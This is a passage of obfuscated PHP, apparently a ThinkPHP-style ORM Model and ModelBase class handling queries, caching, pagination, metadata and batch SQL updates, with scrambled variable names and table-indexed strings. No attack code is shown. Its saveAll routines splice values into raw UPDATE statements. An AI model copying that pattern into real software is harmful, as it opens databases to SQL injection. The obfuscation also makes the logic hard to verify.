$¨áı·Ã[$ñ¸»ıÏè[307]], $¨áı·Ã[$ñ¸»ıÏè[304]]); return $¨áı·Ã; } return !1; } public function data($Æß¦™³ù = '') { $‚°ÍÛ˜ =& $_SERVER[•€áå–Õ]; if ($‚°ÍÛ˜[22] === $Æß¦™³ù && !empty($this->data)) { return $this->data; } if (is_object($Æß¦™³ù)) { $Æß¦™³ù = get_object_vars($Æß¦™³ù); } elseif (is_string($Æß¦™³ù)) { parse_str($Æß¦™³ù, $Æß¦™³ù); } elseif (!is_array($Æß¦™³ù)) { think_exception(think_lang($‚°ÍÛ˜[326])); } $this->data = $Æß¦™³ù; return $this; } public function join($˜Í™Á×Î) { $ä§¼œ°è =& $_SERVER[•€áå–Õ]; if (is_array($˜Í™Á×Î)) { $this->options[$ä§¼œ°è[337]] = $˜Í™Á×Î; } elseif (!empty($˜Í™Á×Î)) { $this->options[$ä§¼œ°è[337]][] = $˜Í™Á×Î; } return $this; } public function union($œŠÁ‚Ôõ, $ƒìã€µÜ = false) { $òÚœÌŒ× =& $_SERVER[•€áå–Õ]; if (empty($œŠÁ‚Ôõ)) { return $this; } if ($ƒìã€µÜ) { $this->options[$òÚœÌŒ×[402]][$òÚœÌŒ×[403]] = !0; } if (is_object($œŠÁ‚Ôõ)) { $œŠÁ‚Ôõ = get_object_vars($œŠÁ‚Ôõ); } if (is_string($œŠÁ‚Ôõ)) { $š‹õÚÚ¥ = $œŠÁ‚Ôõ; } elseif (is_array($œŠÁ‚Ôõ)) { if (isset($œŠÁ‚Ôõ[0])) { $this->options[$òÚœÌŒ×[402]] = array_merge($this->options[$òÚœÌŒ×[402]], $œŠÁ‚Ôõ); return $this; } else { $š‹õÚÚ¥ = $œŠÁ‚Ôõ; } } else { think_exception(think_lang($òÚœÌŒ×[326])); } $this->options[$òÚœÌŒ×[402]][] = $š‹õÚÚ¥; return $this; } public function cache($¾´Éû´Á = true, $¡Ø—Îô = null, $ŸçÜÑÜÒ = '') { $¢Îç‹¡â =& $_SERVER[•€áå–Õ]; if (!1 !== $¾´Éû´Á) { $this->options[$¢Îç‹¡â[404]] = array($¢Îç‹¡â[106] => $¾´Éû´Á, $¢Îç‹¡â[394] => $¡Ø—Îô, $¢Îç‹¡â[43] => $ŸçÜÑÜÒ); } return $this; } public function field($ ÄùÌ­ş, $¹ıùÊ„ = false) { $×ä‹Ù =& $_SERVER[•€áå–Õ]; if (!0 === $ ÄùÌ­ş) { $¯®”´Í“ = $this->getDbFields(); $ ÄùÌ­ş = $¯®”´Í“ ? $¯®”´Í“ : $×ä‹Ù[215]; } elseif ($¹ıùÊ„) { if (is_string($ ÄùÌ­ş)) { $ ÄùÌ­ş = explode($×ä‹Ù[60], $ ÄùÌ­ş); } $¯®”´Í“ = $this->getDbFields(); $ ÄùÌ­ş = $¯®”´Í“ ? array_diff($¯®”´Í“, $ ÄùÌ­ş) : $ ÄùÌ­ş; } $this->options[$×ä‹Ù[328]] = $ ÄùÌ­ş; return $this; } public function scope($¼¢øì– = '', $˜ÁµŠç™ = NULL) { $ı…ˆ¬¢° =& $_SERVER[•€áå–Õ]; if ($ı…ˆ¬¢°[22] === $¼¢øì–) { if (isset($this->_scope[$ı…ˆ¬¢°[47]])) { $ö¤©€“± = $this->_scope[$ı…ˆ¬¢°[47]]; } else { return $this; } } elseif (is_string($¼¢øì–)) { $êĞüÇá = explode($ı…ˆ¬¢°[60], $¼¢øì–); $ö¤©€“± = array(); foreach ($êĞüÇá as $¦£ÊÑÒˆ) { if (!isset($this->_scope[$¦£ÊÑÒˆ])) { continue; } $ö¤©€“± = array_merge($ö¤©€“±, $this->_scope[$¦£ÊÑÒˆ]); } if (!empty($˜ÁµŠç™) && is_array($˜ÁµŠç™)) { $ö¤©€“± = array_merge($ö¤©€“±, $˜ÁµŠç™); } } elseif (is_array($¼¢øì–)) { $ö¤©€“± = $¼¢øì–; } if (is_array($ö¤©€“±) && !empty($ö¤©€“±)) { $this->options = array_merge($this->options, array_change_key_case($ö¤©€“±)); } return $this; } public function where($ ĞÈä‘æ, $ê˜´¿îø = null) { $¼«Œ“¥¹ =& $_SERVER[•€áå–Õ]; if (!is_null($ê˜´¿îø) && is_string($ ĞÈä‘æ)) { if (!is_array($ê˜´¿îø)) { $ê˜´¿îø = func_get_args(); array_shift($ê˜´¿îø); } $ê˜´¿îø = array_map(array($this->db, $¼«Œ“¥¹[398]), $ê˜´¿îø); $ ĞÈä‘æ = vsprintf($ ĞÈä‘æ, $ê˜´¿îø); } elseif (is_object($ ĞÈä‘æ)) { $ ĞÈä‘æ = get_object_vars($ ĞÈä‘æ); } elseif (is_array($ ĞÈä‘æ)) { foreach ($ ĞÈä‘æ as $î«ªı¢Ù => $Ğí©ü¦µ) { if ((is_numeric($î«ªı¢Ù) || !$î«ªı¢Ù) && is_string($Ğí©ü¦µ)) { if (strpos($Ğí©ü¦µ, $¼«Œ“¥¹[405]) === 0) { continue; } think_trace($¼«Œ“¥¹[406], $¼«Œ“¥¹[22], $¼«Œ“¥¹[59]); die; } } } if (is_string($ ĞÈä‘æ) && $¼«Œ“¥¹[22] != $ ĞÈä‘æ) { $±¥»©¬‡ = array(); $±¥»©¬‡[$¼«Œ“¥¹[407]] = $ ĞÈä‘æ; $ ĞÈä‘æ = $±¥»©¬‡; } if (isset($this->options[$¼«Œ“¥¹[330]])) { $this->options[$¼«Œ“¥¹[330]] = array_merge($this->options[$¼«Œ“¥¹[330]], $ ĞÈä‘æ); } else { $this->options[$¼«Œ“¥¹[330]] = $ ĞÈä‘æ; } return $this; } public function limit($ÙøÒ¥®, $·˜‹ï‰Ì = null) { $ª¬–¶€Æ =& $_SERVER[•€áå–Õ]; $this->options[$ª¬–¶€Æ[347]] = is_null($·˜‹ï‰Ì) ? $ÙøÒ¥® : $ÙøÒ¥® . $ª¬–¶€Æ[60] . $·˜‹ï‰Ì; return $this; } public function page($”¯Ù°¯€, $úô÷»êù = null) { $ÇÌÕäƒ =& $_SERVER[•€áå–Õ]; $this->options[$ÇÌÕäƒ[408]] = is_null($úô÷»êù) ? $”¯Ù°¯€ : $”¯Ù°¯€ . $ÇÌÕäƒ[60] . $úô÷»êù; return $this; } public function comment($æÊ¯ª¸) { $this->options[$_SERVER[•€áå–Õ][409]] = $æÊ¯ª¸; return $this; } public function setProperty($Ù¬ô´Ú€, $š„µ±‘) { if (property_exists($this, $Ù¬ô´Ú€)) { $this->{$Ù¬ô´Ú€} = $š„µ±‘; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\x69\146\x79\x54\x69\x6d\x65", "\x74\151\x6d\x65", "\x69\156\x73\145\162\x74\x2c\165\160\144\141\x74\x65", "\146\165\x6e\143\x74\151\x6f\156"), array("\143\x72\x65\x61\164\x65\124\x69\x6d\145", "\x74\151\155\x65", "\x69\x6e\163\145\162\164", "\146\165\156\143\x74\151\157\x6e")); public function setDataAuto($èçÉºÒ) { $this->dataAuto = $èçÉºÒ; } public function __construct($ÅóÒÒşï = '', $úÏåŞéÛ = '', $«ò›òÜÏ = '') { parent::__construct($ÅóÒÒşï, $úÏåŞéÛ, $«ò›òÜÏ); } protected $tableMeta = array(); protected function _beforeInsert(&$æ‡…ÑĞ, $İĞ¼€Õ­) { $Æòìïãê =& $_SERVER[•€áå–Õ]; if (!$this->checkDataAutoHas($Æòìïãê[410])) { return; } $this->dataBeforeFilter($æ‡…ÑĞ, $Æòìïãê[410]); } protected function _beforeUpdate(&$õüöÆğİ, $¼¯œùÏŠ) { $­é«³¿ç =& $_SERVER[•€áå–Õ]; if (!$this->checkDataAutoHas($­é«³¿ç[411])) { return; } $this->dataBeforeFilter($õüöÆğİ, $­é«³¿ç[411]); } protected function _afterSelect(&$‚ßÌÕ€¿, $˜Ç›®ù) { if (!is_array($‚ßÌÕ€¿)) { return; } if (!$this->checkDataAutoHas($_SERVER[•€áå–Õ][412])) { return; } foreach ($‚ßÌÕ€¿ as &$ï˜ßçØ²) { $this->dataAfterFilter($ï˜ßçØ²); } unset($ï˜ßçØ²); } protected function _afterFind(&$àã¦é®ö, $Õ¸°Æºœ) { if (!is_array($àã¦é®ö)) { return; } if (!$this->checkDataAutoHas($_SERVER[•€áå–Õ][412])) { return; } $this->dataAfterFilter($àã¦é®ö); } public static function textEncode($ù¬ˆ•) { if (!$ù¬ˆ•) { return $ù¬ˆ•; } $É®¼æÇÃ = json_encode($ù¬ˆ•); $É®¼æÇÃ = preg_replace_callback($_SERVER[•€áå–Õ][413], function ($ç”Ùè–½) { return addslashes($ç”Ùè–½[0]); }, $É®¼æÇÃ); return json_decode($É®¼æÇÃ); } public static function textDecode($½ó¨ß©) { $‰¥¨ëÒÕ =& $_SERVER[•€áå–Õ]; $Ù»¸©è = json_encode($½ó¨ß©); $Ù»¸©è = preg_replace_callback($‰¥¨ëÒÕ[414], function ($ø¹”Ş”é) { return $_SERVER[•€áå–Õ][109]; }, $Ù»¸©è); return json_decode($Ù»¸©è); } public function setAutoIncrement($†é¥‚ÂÓ) { $ÍàéÀàı = array($this->getPk() => $†é¥‚ÂÓ); $Š‹“µç = $this->data($ÍàéÀàı)->add(); if ($Š‹“µç) { $this->delete($Š‹“µç); } } public function getAutoIncrement() { $›«¢ìè¥ = $this->getTableName(); $ğ»÷ ‡ = $this->max($this->getPk()); $¶Ş’°İì = $this->query("\163\x68\157\167\x20\x74\141\x62\154\145\40\x73\164\141\x74\x75\163\40\167\150\x65\x72\145\x20\x4e\141\155\x65\75\47{$›«¢ìè¥}\47"); $àîËÃ¤ = $¶Ş’°İì[0][$_SERVER[•€áå–Õ][415]]; $ÙàƒÏº’ = max($ğ»÷ ‡, $àîËÃ¤); return $ÙàƒÏº’; } protected function _callBefore($ôâæµÔÃ, $íÑ‰´§×) { return $this->cacheCallCheck($ôâæµÔÃ, $íÑ‰´§×, !1); } protected function _callAfter($‚‘êúÑ, $İ«÷ôåÓ) { return $this->cacheCallCheck($‚‘êúÑ, $İ«÷ôåÓ, !0); } protected function cacheFunctionAlias($œìíÆ•ó) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($Ò½åØ±×, $í·ç…ç, $­èÏÇÆ½ = false) { $Ÿ—©«æÁ = $this->cacheFunctionAlias($í·ç…ç); if (!$Ÿ—©«æÁ) { return; } foreach ($Ÿ—©«æÁ as $Ó¹ŒØı± => $ö±­öü¨) { $ÆÔğİ¶ = $ö±­öü¨[0]; $´†Ş×Š• = explode($_SERVER[•€áå–Õ][60], $ö±­öü¨[1]); if ($Ò½åØ±× == $Ó¹ŒØı±) { return $this->cacheFunctionGet($Ó¹ŒØı±, $ÆÔğİ¶); } if ($­èÏÇÆ½ && in_array($Ò½åØ±×, $´†Ş×Š•)) { $this->cacheFunctionClear($Ó¹ŒØı±, $ÆÔğİ¶); } } } public function cacheFunctionGet($şôªÖã·, $ö¸êßÅÎ) { $ÌåÙòç” = $this->cacheKeyMake($şôªÖã·, $ö¸êßÅÎ); $³Å‘Úç± = Cache::get($ÌåÙòç”); if (!is_array($³Å‘Úç±)) { $³Å‘Úç± = call_user_func_array(array($this, $şôªÖã·), array($ö¸êßÅÎ, !0)); Cache::set($ÌåÙòç”, $³Å‘Úç±); } return $³Å‘Úç±; } public function cacheFunctionClear($¡ˆŠä¿Š, $äƒæ­Çñ) { $Û±²„Ä½ = $äƒæ­Çñ; if (!is_array($äƒæ­Çñ)) { $Û±²„Ä½ = array($äƒæ­Çñ); } foreach ($Û±²„Ä½ as $­‹Ä¤˜“) { $¹Üˆø¬ = $this->cacheKeyMake($¡ˆŠä¿Š, $­‹Ä¤˜“); Cache::remove($¹Üˆø¬); } } private function cacheKeyMake($İšñ§‰ó, $ğë²‹Øì) { $¬Ğæøí¢ =& $_SERVER[•€áå–Õ]; return get_class($this) . $¬Ğæøí¢[21] . $İšñ§‰ó . $¬Ğæøí¢[416] . $ğë²‹Øì; } protected function selectPageReset() { $˜Ñ¤·Ç­ =& $_SERVER[•€áå–Õ]; if (isset($GLOBALS[$˜Ñ¤·Ç­[417]])) { return; } $GLOBALS[$˜Ñ¤·Ç­[417]] = isset($GLOBALS[$˜Ñ¤·Ç­[17]][$˜Ñ¤·Ç­[418]]) ? $GLOBALS[$˜Ñ¤·Ç­[17]][$˜Ñ¤·Ç­[418]] : !1; $GLOBALS[$˜Ñ¤·Ç­[419]] = isset($GLOBALS[$˜Ñ¤·Ç­[17]][$˜Ñ¤·Ç­[408]]) ? $GLOBALS[$˜Ñ¤·Ç­[17]][$˜Ñ¤·Ç­[408]] : !1; $GLOBALS[$˜Ñ¤·Ç­[17]][$˜Ñ¤·Ç­[418]] = !1; $GLOBALS[$˜Ñ¤·Ç­[17]][$˜Ñ¤·Ç­[408]] = !1; } protected function selectPageRestore() { $„“ƒ”£š =& $_SERVER[•€áå–Õ]; if (!isset($GLOBALS[$„“ƒ”£š[417]])) { return; } $GLOBALS[$„“ƒ”£š[17]][$„“ƒ”£š[418]] = $GLOBALS[$„“ƒ”£š[417]]; $GLOBALS[$„“ƒ”£š[17]][$„“ƒ”£š[408]] = $GLOBALS[$„“ƒ”£š[419]]; if ($GLOBALS[$„“ƒ”£š[17]][$„“ƒ”£š[418]] === !1) { unset($GLOBALS[$„“ƒ”£š[17]][$„“ƒ”£š[418]]); } if ($GLOBALS[$„“ƒ”£š[17]][$„“ƒ”£š[408]] === !1) { unset($GLOBALS[$„“ƒ”£š[17]][$„“ƒ”£š[408]]); } unset($GLOBALS[$„“ƒ”£š[417]]); unset($GLOBALS[$„“ƒ”£š[419]]); } protected function selectPage($´°©¢çö = 200, $ŞÀ¸ôøƒ = 1) { $µ—í‹Ÿ„ =& $_SERVER[•€áå–Õ]; global $in; $ïšäÁÃ© = $this->optionsValue(); $ìÀóŒúı = 50000; $´°©¢çö = isset($in[$µ—í‹Ÿ„[418]]) && $in[$µ—í‹Ÿ„[418]] ? $in[$µ—í‹Ÿ„[418]] : $´°©¢çö; if ($´°©¢çö === -1) { $in[$µ—í‹Ÿ„[418]] = !1; $ìÀóŒúı = 100000000; $´°©¢çö = $ìÀóŒúı; } $¾İ»¡ÅÇ = $ïšäÁÃ©; $¾İ»¡ÅÇ[$µ—í‹Ÿ„[420]] = array(); $´°©¢çö = intval($´°©¢çö); $´°©¢çö = $´°©¢çö <= 5 ? 5 : ($´°©¢çö >= $ìÀóŒúı ? $ìÀóŒúı : $´°©¢çö); $ŞÀ¸ôøƒ = intval(isset($in[$µ—í‹Ÿ„[408]]) && $in[$µ—í‹Ÿ„[408]] ? $in[$µ—í‹Ÿ„[408]] : $ŞÀ¸ôøƒ); $ŞÀ¸ôøƒ = $ŞÀ¸ôøƒ <= 1 ? 1 : $ŞÀ¸ôøƒ; $õ€¦È¶È = array(); $ÂÕ¥…Šú = 1; if ($ŞÀ¸ôøƒ == 1 && $ÂÕ¥…Šú) { $this->optionsValue($ïšäÁÃ©); $õ€¦È¶È = $this->page($ŞÀ¸ôøƒ, $´°©¢çö)->select(); $ıÛ‰ÃÁª = is_array($õ€¦È¶È) ? count($õ€¦È¶È) : 0; if ($ıÛ‰ÃÁª < $´°©¢çö) { $©î¾¨í– = 1; } else { $this->optionsValue($¾İ»¡ÅÇ); $ıÛ‰ÃÁª = intval($this->count()); $©î¾¨í– = ceil($ıÛ‰ÃÁª / $´°©¢çö); } } else { $this->optionsValue($¾İ»¡ÅÇ); $ıÛ‰ÃÁª = intval($this->count()); $©î¾¨í– = ceil($ıÛ‰ÃÁª / $´°©¢çö); $ŞÀ¸ôøƒ = $ŞÀ¸ôøƒ >= $©î¾¨í– ? $©î¾¨í– : $ŞÀ¸ôøƒ; $this->optionsValue($ïšäÁÃ©); $õ€¦È¶È = $this->page($ŞÀ¸ôøƒ, $´°©¢çö)->select(); } if (!is_array($õ€¦È¶È)) { $õ€¦È¶È = array(); } if ($©î¾¨í– == 1) { $ıÛ‰ÃÁª = count($õ€¦È¶È); } $È¬Üíˆ° = array($µ—í‹Ÿ„[421] => array($µ—í‹Ÿ„[422] => $ıÛ‰ÃÁª, $µ—í‹Ÿ„[418] => $´°©¢çö, $µ—í‹Ÿ„[408] => $ŞÀ¸ôøƒ, $µ—í‹Ÿ„[423] => $©î¾¨í–), $µ—í‹Ÿ„[424] => $õ€¦È¶È); return $È¬Üíˆ°; } protected function checkLength($Ò‡¯Šä, $–®×¬•¾ = 0, $ÏˆİÂ¼ = '') { $Æôø¥şº =& $_SERVER[•€áå–Õ]; $–®×¬•¾ = $–®×¬•¾ ? $–®×¬•¾ : 65536; if (!$Ò‡¯Šä || strlen($Ò‡¯Šä) < $–®×¬•¾) { return; } $ÏˆİÂ¼ = $ÏˆİÂ¼ ? $ÏˆİÂ¼ . $Æôø¥şº[83] : $Æôø¥şº[22]; show_json($ÏˆİÂ¼ . LNG($Æôø¥şº[425]) . "\50{$–®×¬•¾}\x29", !1); } protected function metaSet($ÒµıÎğü, $ÈæĞïëó = null, $ë÷ºßËá = null) { $¹ÅöÍüİ =& $_SERVER[•€áå–Õ]; if (!$this->tableMeta || !$ÒµıÎğü) { return !1; } $íùÔŸÏÔ = $this->tableMeta[$¹ÅöÍüİ[426]]; $ªõÒÊÉ« = $this->tableMeta[$¹ÅöÍüİ[427]]; $ò¯ÔÓšÃ = Model($ªõÒÊÉ«); $…êÒóı = array($íùÔŸÏÔ => $ÒµıÎğü, $¹ÅöÍüİ[428] => $ÈæĞïëó); if (is_null($ÈæĞïëó)) { return $ò¯ÔÓšÃ->where(array($íùÔŸÏÔ => $ÒµıÎğü))->delete(); } if (is_null($ë÷ºßËá) && is_string($ÈæĞïëó)) { return $ò¯ÔÓšÃ->where($…êÒóı)->delete(); } $ïÂÓßéÃ = is_array($ÈæĞïëó) ? $ÈæĞïëó : array(); if (is_string($ÈæĞïëó)) { $ïÂÓßéÃ[$ÈæĞïëó] = $ë÷ºßËá; } $ñçØ‚¼¡ = array(); foreach ($ïÂÓßéÃ as $æéûäŒ => $§·ºáÛ) { if (is_null($§·ºáÛ) && is_string($æéûäŒ)) { $ò¯ÔÓšÃ->where(array($íùÔŸÏÔ => $ÒµıÎğü, $¹ÅöÍüİ[428] => $æéûäŒ))->delete(); continue; } $this->checkLength($§·ºáÛ, !1, $ªõÒÊÉ« . $¹ÅöÍüİ[4] . $æéûäŒ); $ñçØ‚¼¡[] = array($íùÔŸÏÔ => $ÒµıÎğü, $¹ÅöÍüİ[106] => $æéûäŒ, $¹ÅöÍüİ[429] => $§·ºáÛ); } $‰ƒ‰Ô¤é = $¹ÅöÍüİ[430] . $ªõÒÊÉ«; CacheLock::lock($‰ƒ‰Ô¤é); $ò¯ÔÓšÃ->where(array($íùÔŸÏÔ => $ÒµıÎğü))->addAll($ñçØ‚¼¡, array(), !0); CacheLock::unlock($‰ƒ‰Ô¤é); return !0; } public function metaGet($¢ºÄÈ•ë, $ˆî¬¬ìê = false) { $³ˆ¥ßÂ =& $_SERVER[•€áå–Õ]; if (!$this->tableMeta) { return array(); } $íó²îÙÇ = $this->tableMeta[$³ˆ¥ßÂ[426]]; $òõíÁ¢½ = Model($this->tableMeta[$³ˆ¥ßÂ[427]]); if ($ˆî¬¬ìê) { $­ÄÖèš– = array($íó²îÙÇ => $¢ºÄÈ•ë, $³ˆ¥ßÂ[106] => $ˆî¬¬ìê); return $òõíÁ¢½->where($­ÄÖèš–)->getField($³ˆ¥ßÂ[429]); } $­ÄÖèš– = array($íó²îÙÇ => $¢ºÄÈ•ë); $ÅïÀå‘± = $òõíÁ¢½->field($³ˆ¥ßÂ[431])->where($­ÄÖèš–)->select(); $ÅïÀå‘± = array_to_keyvalue($ÅïÀå‘±, $³ˆ¥ßÂ[106], $³ˆ¥ßÂ[429]); return $ÅïÀå‘±; } private function checkDataAutoHas($ĞÀú–«Ô) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $€§œş“) { if (in_array($ĞÀú–«Ô, explode($_SERVER[•€áå–Õ][60], $€§œş“[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$Ø˜ƒÚ‡ì, $ôÇ©Æ”‘) { $ Ë¸¯Ù÷ =& $_SERVER[•€áå–Õ]; if (!is_array($Ø˜ƒÚ‡ì)) { return; } foreach ($this->dataAuto as $«ó«ùïú) { $¸Şİ ¸™ = $«ó«ùïú[0]; if (!in_array($ôÇ©Æ”‘, explode($ Ë¸¯Ù÷[60], $«ó«ùïú[2]))) { continue; } switch (trim($«ó«ùïú[3])) { case $ Ë¸¯Ù÷[376]: case $ Ë¸¯Ù÷[377]: $æ™¶ôÇû = $«ó«ùïú[1]; $•Ô¾ıßÚ = isset($«ó«ùïú[4]) ? (array) $«ó«ùïú[4] : array(); if ($æ™¶ôÇû == $ Ë¸¯Ù÷[206] && array_key_exists($¸Şİ ¸™, $Ø˜ƒÚ‡ì)) { if (!$Ø˜ƒÚ‡ì[$¸Şİ ¸™]) { unset($Ø˜ƒÚ‡ì[$¸Şİ ¸™]); } break; } if (isset($Ø˜ƒÚ‡ì[$¸Şİ ¸™])) { array_unshift($•Ô¾ıßÚ, $Ø˜ƒÚ‡ì[$¸Şİ ¸™]); } if ($ Ë¸¯Ù÷[376] == $«ó«ùïú[3]) { $Ø˜ƒÚ‡ì[$¸Şİ ¸™] = call_user_func_array($æ™¶ôÇû, $•Ô¾ıßÚ); } else { $Ø˜ƒÚ‡ì[$¸Şİ ¸™] = call_user_func_array(array(&$this, $æ™¶ôÇû), $•Ô¾ıßÚ); } break; case $ Ë¸¯Ù÷[325]: if (isset($Ø˜ƒÚ‡ì[$¸Şİ ¸™]) && $Ø˜ƒÚ‡ì[$¸Şİ ¸™]) { $Ø˜ƒÚ‡ì[$¸Şİ ¸™] = call_user_func_array(array(&$this, $«ó«ùïú[1]), array($Ø˜ƒÚ‡ì[$¸Şİ ¸™])); } break; case $ Ë¸¯Ù÷[328]: $Ø˜ƒÚ‡ì[$¸Şİ ¸™] = $Ø˜ƒÚ‡ì[$«ó«ùïú[1]]; break; case $ Ë¸¯Ù÷[349]: if (isset($Ø˜ƒÚ‡ì[$¸Şİ ¸™]) && !is_string($Ø˜ƒÚ‡ì[$¸Şİ ¸™])) { $Ø˜ƒÚ‡ì[$¸Şİ ¸™] = json_encode_force($Ø˜ƒÚ‡ì[$¸Şİ ¸™]); } break; case $ Ë¸¯Ù÷[378]: if ($Ø˜ƒÚ‡ì[$¸Şİ ¸™] === $ Ë¸¯Ù÷[22]) { unset($Ø˜ƒÚ‡ì[$¸Şİ ¸™]); } break; case $ Ë¸¯Ù÷[379]: $Ø˜ƒÚ‡ì[$¸Şİ ¸™] = $«ó«ùïú[1]; default: break; } } if ($ôÇ©Æ”‘ == $ Ë¸¯Ù÷[410]) { $Õ™ƒ¶Ş÷ = strtolower($this->db->getDbType()); if (strpos($Õ™ƒ¶Ş÷, $ Ë¸¯Ù÷[23]) !== 0) { return; } $Ğ´Ï«ñı = $this->field(!0)->fields; $ä”ù’ŒÍ = $Ğ´Ï«ñı[$ Ë¸¯Ù÷[307]]; if (isset($Ğ´Ï«ñı[$ Ë¸¯Ù÷[306]])) { unset($ä”ù’ŒÍ[$Ğ´Ï«ñı[$ Ë¸¯Ù÷[306]]]); } foreach ($ä”ù’ŒÍ as $î¥¬È«¿ => $ôÇ©Æ”‘) { if (!isset($Ø˜ƒÚ‡ì[$î¥¬È«¿])) { $Ø˜ƒÚ‡ì[$î¥¬È«¿] = $ Ë¸¯Ù÷[22]; } } } } private function dataAfterFilter(&$÷öë²Û) { $×¸ Å®™ =& $_SERVER[•€áå–Õ]; foreach ($this->dataAuto as $ÔÖ€å) { $Ö…ïÊíˆ = $ÔÖ€å[0]; if (!isset($÷öë²Û[$Ö…ïÊíˆ])) { continue; } if (!in_array($×¸ Å®™[412], explode($×¸ Å®™[60], $ÔÖ€å[2]))) { continue; } switch (trim($ÔÖ€å[3])) { case $×¸ Å®™[376]: case $×¸ Å®™[377]: $¹ë§¯†„ = isset($ÔÖ€å[4]) ? (array) $ÔÖ€å[4] : array(); array_unshift($¹ë§¯†„, $÷öë²Û[$Ö…ïÊíˆ]); if (isset($ÔÖ€å[4]) && $ÔÖ€å[4] == $×¸ Å®™[432]) { $¹ë§¯†„ = array($÷öë²Û[$Ö…ïÊíˆ]); } if ($×¸ Å®™[376] == $ÔÖ€å[3]) { $÷öë²Û[$Ö…ïÊíˆ] = call_user_func_array($ÔÖ€å[1], $¹ë§¯†„); } else { $÷öë²Û[$Ö…ïÊíˆ] = call_user_func_array(array(&$this, $ÔÖ€å[1]), $¹ë§¯†„); } break; case $×¸ Å®™[325]: if (isset($÷öë²Û[$Ö…ïÊíˆ]) && $÷öë²Û[$Ö…ïÊíˆ]) { $÷öë²Û[$Ö…ïÊíˆ] = call_user_func_array(array(&$this, $ÔÖ€å[1]), array($÷öë²Û[$Ö…ïÊíˆ])); } break; case $×¸ Å®™[328]: $÷öë²Û[$Ö…ïÊíˆ] = $÷öë²Û[$ÔÖ€å[1]]; break; case $×¸ Å®™[349]: $Ûôı¸É£ = $÷öë²Û[$Ö…ïÊíˆ]; $÷öë²Û[$Ö…ïÊíˆ] = json_decode($Ûôı¸É£, !0); if (is_null($÷öë²Û[$Ö…ïÊíˆ])) { $÷öë²Û[$Ö…ïÊíˆ] = $Ûôı¸É£; } break; case $×¸ Å®™[378]: if ($÷öë²Û[$Ö…ïÊíˆ] === $×¸ Å®™[22]) { unset($÷öë²Û[$Ö…ïÊíˆ]); } break; case $×¸ Å®™[379]: $÷öë²Û[$Ö…ïÊíˆ] = $ÔÖ€å[1]; break; default: break; } } } public function saveAll($ÇÁÛ¾ä) { $À¾»áà =& $_SERVER[•€áå–Õ]; $ ¢ ÷Íô = $this->tablePrefix . $this->tableName; $»¢‰‚—ä = self::SQL_WHERE_IN_CHUNK; $ÇÁÛ¾ä = is_array($ÇÁÛ¾ä) ? $ÇÁÛ¾ä : array(); $‡¼Ö„œÒ = $À¾»áà[433]; $‚®ŒÔ–é = 0; $Ó×Úë÷ = array(); $¥–Ã×ö£ = count($ÇÁÛ¾ä); for ($”Ğ¨©ÄŠ = 0; $”Ğ¨©ÄŠ < $¥–Ã×ö£; $”Ğ¨©ÄŠ++) { $ñÂõá“ = $ÇÁÛ¾ä[$”Ğ¨©ÄŠ]; if (!is_array($ñÂõá“) || count($ñÂõá“) != 4) { continue; } $•ŒÕ’³– = "\x55\x50\x44\101\x54\105\x20\x60{$ ¢ ÷Íô}\140\40\x53\x45\x54\x20{$ñÂõá“[2]}\x20\x3d\40\103\x41\123\x45\x20{$ñÂõá“[0]}\40\xa"; if ($‚®ŒÔ–é == 0) { $‡¼Ö„œÒ = $•ŒÕ’³–; } $Ó×Úë÷[] = $À¾»áà[130] . $ñÂõá“[1] . $À¾»áà[130]; $‚®ŒÔ–é++; $‡¼Ö„œÒ .= "\x20\127\110\105\116\40\47{$ñÂõá“[1]}\47\x20\124\x48\x45\x4e\x20\47{$ñÂõá“[3]}\47\x20\12"; if ($‚®ŒÔ–é == $»¢‰‚—ä || $”Ğ¨©ÄŠ == $¥–Ã×ö£ - 1) { $‚İŸÒ²ó = implode($À¾»áà[60], $Ó×Úë÷); $‡¼Ö„œÒ .= "\40\105\116\x44\40\40\x57\110\x45\122\x45\x20{$ñÂõá“[0]}\x20\x49\x4e\40\x28{$‚İŸÒ²ó}\51\x20"; $this->execute($‡¼Ö„œÒ); $‚®ŒÔ–é = 0; $‡¼Ö„œÒ = $•ŒÕ’³–; $this->chunkEventCheck(count($Ó×Úë÷)); $Ó×Úë÷ = array(); } } $this->chunkEventSet(); } public function saveAllEach($‚ÇóêÎ) { $¯¡Ñ“ö¦ =& $_SERVER[•€áå–Õ]; $ÜÆìĞôŸ = $this->tablePrefix . $this->tableName; foreach ($‚ÇóêÎ as $½š¦æ·Ë) { if (!is_array($½š¦æ·Ë) || count($½š¦æ·Ë) != 4) { continue; } $òôíİª = $½š¦æ·Ë[0] . $¯¡Ñ“ö¦[434] . $½š¦æ·Ë[1] . $¯¡Ñ“ö¦[130]; $¸š»ıİ = $½š¦æ·Ë[2] . $¯¡Ñ“ö¦[434] . $½š¦æ·Ë[3] . $¯¡Ñ“ö¦[130]; $¸æñº³û = "\x75\x70\x64\x61\x74\145\x20{$ÜÆìĞôŸ}\x20\x73\x65\x74\x20{$¸š»ıİ}\x20\x77\x68\x65\x72\x65\40{$òôíİª}\73"; $this->execute($¸æñº³û); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Ë‹®›ÜŞ = false, $Â…ÌÒşÀ = false) { $this->_chunkEvent = $Ë‹®›ÜŞ; $this->_chunkEventParam = $Â…ÌÒşÀ; } private function chunkEventCheck($‰ú¼ßˆ§) { if (!$this->_chunkEvent) { return; } $‹Ê†½œŸ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $‹Ê†½œŸ[$_SERVER[•€áå–Õ][435]] = $‰ú¼ßˆ§; Hook::trigger($this->_chunkEvent, $‹Ê†½œŸ); } public function addAll($¹ŒìØ, $Ú¦€è»ˆ = array(), $ØÜ“èÄ = false) { $ã½×éÓÉ =& $_SERVER[•€áå–Õ]; ignore_timeout(); $Şü‘ğó¿ = self::SQL_WHERE_IN_CHUNK; if (empty($¹ŒìØ)) { $this->error = think_lang($ã½×éÓÉ[326]); return !1; } $Ú¦€è»ˆ = $this->_parseOptions($Ú¦€è»ˆ); foreach ($¹ŒìØ as $“Ø¦²• => $¦•ÈÙÓ) { $¹ŒìØ[$“Ø¦²•] = $this->_facade($¦•ÈÙÓ); $this->_beforeInsert($¹ŒìØ[$“Ø¦²•], $Ú¦€è»ˆ); } if (method_exists($this->db, 